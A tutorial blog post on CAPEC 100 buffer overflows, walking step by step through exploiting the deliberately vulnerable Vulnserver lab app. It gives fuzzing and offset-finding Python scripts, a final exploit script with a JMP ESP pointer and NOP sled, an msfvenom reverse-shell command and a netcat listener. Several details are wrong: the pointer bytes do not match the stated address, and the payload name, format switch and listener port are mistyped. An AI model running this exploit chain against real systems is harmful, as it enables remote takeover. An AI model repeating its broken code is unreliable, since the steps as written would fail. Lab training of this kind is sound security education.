---
title: CAPEC 100 - Overflow Buffers
categories: [Ethical Hacking, CAPEC]
tag: [buffer overflow]
comments: true
---
# Overview

Buffer overflow vulnerabilities are commonly targeted by exploiting buffer sizes. For example, if a buffer is set to allow 8 bytes however 10 are pushed to the buffer, the bytes can overflow into the next buffer. Below is a simple example depicting two buffers with a size of 8 bytes each. The second step depicts the push of 10 bytes to buffer 1, followed by the resulting buffer overflow of the extra two bytes that are ultimately pushed into buffer 2. Although the example depicts only 10 bytes being pushed to the buffer, this number can be increased and cause an overflow to multiple areas of memory that are located after the buffer. Buffer overflow will often result in an application crashing as integral data is overwritten by the overflow data.

    ```C#
    buffer1[8] = 0
    buffer2[8] = 0

    push 0123456789 to buffer1

    buffer1 = 0123456789
    buffer2 = 89
    ```

Buffer Overflows can be controlled to allow shellcode execution and the ability for an attacker to gain root/system access on a host or have the targeted application perform contradictory operations such as allowing authentication in some instances.

| [CAPEC](https://capec.mitre.org/data/definitions/100.html) |
| ---------------------------------------------------------- |
| Buffer Overflow attacks target improper or missing bounds checking on buffer operations, typically triggered by <br> input injected by an adversary. As a consequence, an adversary is able to write past the boundaries of allocated <br> buffer regions in memory, causing a program crash or potentially redirection of execution as per the adversaries' <br> choice. |

# Techniques

1. Explore
    - **Identify target application:** The adversary identifies a target application or program to perform the buffer overflow on. Adversaries often look for applications that accept user input and that perform manual memory management.

2. Experiment
    - **Find injection vector:** The adversary identifies an injection vector to deliver the excessive content to the targeted application's buffer.
        > Provide large input to a program or application and observe the behavior. If there is a crash, this means that a buffer overflow attack is possible.
    - **Craft overflow content:** The adversary crafts the content to be injected. If the intent is to simply cause the software to crash, the content need only consist of an excessive quantity of random data. If the intent is to leverage the overflow for execution of arbitrary code, the adversary crafts the payload in such a way that the overwritten return address is replaced with one of the adversary's choosing.
        > Create malicious shellcode that will execute when the program execution is returned to it.
        > Use a NOP-sled in the overflow content to more easily "slide" into the malicious code. This is done so that the exact return address need not be correct, only in the range of all of the NOPs
3. Exploit
    - **Overflow the buffer:** Using the injection vector, the adversary injects the crafted overflow content into the buffer.

## Steps to Conduct a Buffer Overflow

The following examples are based on the [Vulnserver](https://github.com/stephenbradshaw/vulnserver) application which is an intentionally vulnerable application specifically designed for testing these techniques against. The [Immunity Debugger](https://www.immunityinc.com/products/debugger/) is being used to debug the code as the activities are conducted. 

> Vulnserver and Immunity Debugger must be run as administrator during the testing.
{: .prompt-info }

To setup the environment, two hosts are required: a Kali Linux host and a Windows 10 host. Install both Vulnserver and Immunity on the Windows 10 host.

1. Explore
   - **Identify target application:** Vulnserver is being used for this example.

2. Experiment
   - **Find injection vector:** Kali Linux has a built-in tool called `generic_send_tcp` that is used to generate TCP connections with the Vulnserver application and send data to the various inputs. The following is a sample of some of the inputs that are present on the Vulnserver application. This method of finding the injection vector is also referred to as spiking.

        ```plaintext
        STATS [stat_value]
        RTIME [rtime_value]
        LTIME [ltime_value]
        SRUN [srun_value]
        TRUN [trun_value]
        GMON [gmon_value]
        ```

      - Using the `generic_send_tcp`, each buffer can be sent a large input in an attempt to identify buffer overflow vulnerabilities. The tool requires a `spike_script` to be compiled before running against an application. The generic command parameter to run the tool is `generic_send_tcp host port spike_script SKIPVAR SKIPSTR`. The spike_script should contain the following information, the `%INPUT%` field should be replaced with the application input being tested.
        
        ```C#
        s_readline();
        s_string("%INPUT% ");
        s_string_variable("0");
        ```

      - Running the test on `TRUN` identified a buffer overflow vulnerability. The below screenshot shows the evidence via immunity debugger. Note that the value `A` is repeated in register `EAX` and has overflowed into additional registers `ESP`, `EBP`, and `EIP`. The values of `EBP` and `EIP` are expressed in Hex equivalent (A = 41).

        ![Immunity Debugger - Buffer Overflow Example](/assets/img/posts/ETH/CAPEC/100_Experiment_ImmunityDBG.png "Immunity Debugger - Buffer Overflow Example")

    - **Craft overflow content:**
      - Having identified that `TRUN` is vulnerable, the next step is to identify the exact byte count at which the the application crash occurs. A fuzzing script can be written and used against `TRUN` to step the fuzzing process, the below python script from the [TCM Academy - Practical Ethical Hacking](https://academy.tcm-sec.com/) course with the slight addition of creating variables for the target values.

        ```python
        #!/usr/bin/python3
        import sys, socket
        from time import sleep

        tInput = "TRUN /.:/"
        buffer = "A" * 100
        tIp = '%IP%'
        tPort = %PORT%

        while True:
            try:

                s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
                s.connect((tIp,tPort))

                payload = tInput + buffer

                s.send((payload.encode()))
                s.close
                sleep(1)
                buffer = buffer + "A"*100

            except:
                print ("Fuzzing crashed at %s bytes" % str(len(buffer)))
                sys.exit()
        ```
        
        Once the script has completed, the byte count will be printed to the terminal. In this example, the application crashed at **3300 bytes** and did not overwrite another registers apart from the `EAX`.
        - The next phase once the byte count has been determined is to identify the memory offset for the `EIP` register as it is the one in which requires to be overwritten with attacking code. Metasploit contains a module to create a pattern that will be used for the offset. Running the Metasploit module can be achieved via the below command with the switch `-l` indicating the byte count.

            ```bash
            /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 3300
            ```

        - Copy the output of the command, and either create a new Python script or alter the previous one used for the byte count discovery as per the example snippet below. Paste the copied offset string into `%OFFSET%` and enter the `%IP%` and `%PORT%` details. 

            ```python
            #!/usr/bin/python3
            import sys, socket

            tInput = "TRUN /.:/"
            offset = "%OFFSET%"
            tIp = '%IP%'
            tPort = %PORT%

            try:

                s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
                s.connect((tIp,tPort))

                payload = tInput + offset

                s.send((payload.encode()))
                s.close
                    
            except:
                print ("Error connecting to server")
                sys.exit()
            ```

        - Run the python script and it should again cause the application to crash and identify the `EIP` register address within the Immunity Debugger output, which can be seen in the below image. Of particular note is the memory address of the `EIP` which in this example is `386F4337`.

            ![Immunity Debugger - Buffer Overflow Example EIP](/assets/img/posts/ETH/CAPEC/100_Experiment_ImmunityDBG_EIP.png "Immunity Debugger - Buffer Overflow Example EIP")
        
        - With the memory address of the `EIP` register obtained, another metasploit similar to that run to create the offset pattern can be executed to find the exact point in which the `EIP` is located in the offset code. The Metasploit command is as follows with the switch `-l` indicating the byte count and `-q` representing the `EIP` memory location. Executing the tool will print the offset byte in which the `EIP` begins, in this example that is after **byte 2003**.

            ```bash
            /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l 3300 -q 386F4337
            ```

        - With the `EIP` identified, it is good practice to first identify any bad characters that could interfere with injected malicious shellcode. This specific example does not require this step, however further details can be found on this [Bulb Security](https://www.bulbsecurity.com/finding-bad-characters-with-immunity-debugger-and-mona-py/) post about identifying any bad characters using Immunity Debugger. This section can also be performed after the next step as Mona.py contains a function `bytearray` to check for bad characters.
        - The next phase of crafting the overflow content is to identify modules or .dll file that do not have any memory protections. [Mona.py](https://github.com/corelan/mona/blob/master/mona.py) is a plugin for Immunity Debugger that can be used to identify such modules. After downloading and moving the python script into the `C:\Program Files (x86)\Immunity Inc\Immunity Debugger\PyCommands` directory, restart Immunity Debugger and reattach the Vulnserver application. On the bottom portion of the Immunity Debugger is a command window, enter `!mona modules` to execute the plugin and run the modules function. Doing so will provide an output similar to that below. Note that the module `essFunc.dll` returns False against all checks, making it a prime candidate to abuse.

            ![Immunity Debugger - Mona Modules](/assets/img/posts/ETH/CAPEC/100_Experiment_ImmunityDBG_Mona_Modules.png "Immunity Debugger - Mona Modules")

        - With the previously identified module `essFunc.dll`, there are two other mona.py functions that can be run to identify pointers within the application that reference the module. First, the opcode for `JMP ESP` must be identified using `!mona assemble -s "JMP ESP"` which will output the opcode `\xff\xe4`. Using this opcode, the pointers can be printed for the module using `!mona find -s "\xff\xe4" -m essfunc.dll`. Ultimately, in this example, 9 pointers were identified that can be leveraged along with their attributed return memory addresses as per the image below. Any of the return addresses can be used, however `0x625011d3` is selected for this example.

            ![Immunity Debugger - Mona essFunc.dll Pointers](/assets/img/posts/ETH/CAPEC/100_Experiment_ImmunityDBG_Mona_Pointers.png "Immunity Debugger - Mona essFunc.dll Pointers")
        
        - The previous Python script used comes into play once again, this time amending the contents or creating a new python script with the following changes. Note that the pointer variable contains the address `0x625011d3` converted to Hex and presented in [little-endian](https://www.techopedia.com/definition/12892/little-endian), meaning that the order is reversed, which is a requirement when dealing with application in the x86 format.

            ```python
            #!/usr/bin/python3
            import sys, socket

            tInput = b"TRUN /.:/"
            pointer = b"\xaf\x11\x50\x62"
            nopSled = b"\x90" * 32
            overflow = b""
            shellcode = b"A" * 2003 + pointer + nopSled + overflow
            tIp = '%IP%'
            tPort = %PORT%

            try:

                s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
                s.connect((tIp,tPort))

                payload = tInput + shellcode

                s.send((payload))
                s.close
                    
            except:
                print ("Error connecting to server")
                sys.exit()
            ```

        - The Python script sets a jump condition to the `ESP` register, meaning that the `EIP` should be set to the memory address `0x625011d3`. The last stage is to now inject the malicious shellcode into the buffer overflow to exploit the application. For this example, a reverse TCP shell is being generated via the Metaploit payload generator, [Msfvenom](https://darkcybe.github.io/posts/Capabilities/#malware-development-with-msfvenom), via the below command. Replace the `%IP%` and `%PORT%` as necessary.

            ```bash
            msfvenom -p windows/shell_reverse_rcp LHOST=%IP% LPORT=%PORT% EXITFUNC=thread -f -c -a x86 -b "\x00"
            ```

            > The `-b` switch is used to list bad characters, if there are any additional they should be added. The example above depicts the NULL byte character.
        
        - Executing the Msfvenom command will output an unsigned char buf string, copy this code and add it to the python script as shown above within the `overflow` variable.

3. Exploit
        - The `shellcode` variable is now structured to complete the exploit. With an open a netcat listener (`nc -nvlp &PORT%`) on the port chosen, the exploit can be executed with the result being a root shell via the buffer overflow.

# Sources
- [TCM Academy - Practical Ethical Hacking](https://academy.tcm-sec.com/)
- [Hacking - The Art of Exploitation 2nd Edition](https://www.amazon.com.au/Hacking-Art-Exploitation-Jon-Erickson/dp/1593271441)
- [OWASP - Buffer Overflow Attack](https://owasp.org/www-community/attacks/Buffer_overflow_attack)
- [Catharsis - Basic Buffer Overflow Guide](https://catharsis.net.au/blog/basic-buffer-overflow-guide/)
- [Bulb Security - Finding Bad Characters with Immunity Debugger and Mona.py](https://www.bulbsecurity.com/finding-bad-characters-with-immunity-debugger-and-mona-py/)